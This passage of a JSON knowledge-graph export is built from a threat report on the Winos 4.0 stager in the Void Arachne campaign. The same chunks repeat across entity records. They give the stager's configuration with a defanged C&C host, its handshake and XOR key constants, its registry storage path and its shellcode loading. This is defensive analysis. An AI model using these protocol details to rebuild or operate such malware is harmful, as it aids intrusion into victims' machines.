          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos 4.0",
      "type": "Tool",
      "id": "tool--winox-4.0",
      "description": "恶意软件加载器",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "103[.]214[.]147[.]14[.]webcamcn[.]xyz:80",
      "type": "Asset",
      "id": "asset--c2-server-2",
      "description": "第二个C&C服务器",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 28,
          "chunk_type": "table",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
          "chunk_length": 1064,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "table",
            "token_length": 306,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 28,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "C2 Communication",
      "type": "Technique",
      "id": "technique--c2-communication",
      "description": "与C&C服务器通信的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Encryption Key Generation",
      "type": "Procedure",
      "id": "procedure--encryption-key-generation",
      "description": "生成加密密钥以保护通信",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Windows Registry",
      "type": "Asset",
      "id": "asset--windows-registry",
      "description": "Windows注册表",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--behind-great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "登录模块.dll (LoginModule.dll)",
      "type": "Tool",
      "id": "tool--loginmodule-dll",
      "description": "下一阶段payload插件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Shellcode Execution",
      "type": "Procedure",
      "id": "procedure--shellcode-execution",
      "description": "执行shellcode以加载模块",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Payload Deployment",
      "type": "Procedure",
      "id": "procedure--payload-deployment",
      "description": "部署下一阶段的payload插件",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos 4.0 stager",
      "type": "Tool",
      "id": "tool--wino4-stager",
      "description": "恶意软件加载器",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 29,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
          "chunk_length": 3095,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Technical analysis",
            "Header 3": "### Winos 4.0 stager analysis",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Technical analysis",
              "### Winos 4.0 stager analysis"
            ],
            "content_type": "text",
            "token_length": 660,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 29,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Antivirus Software",
      "type": "Target",
      "id": "target--antivirus-software",
      "description": "目标杀毒软件列表",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 31,
          "chunk_type": "text",
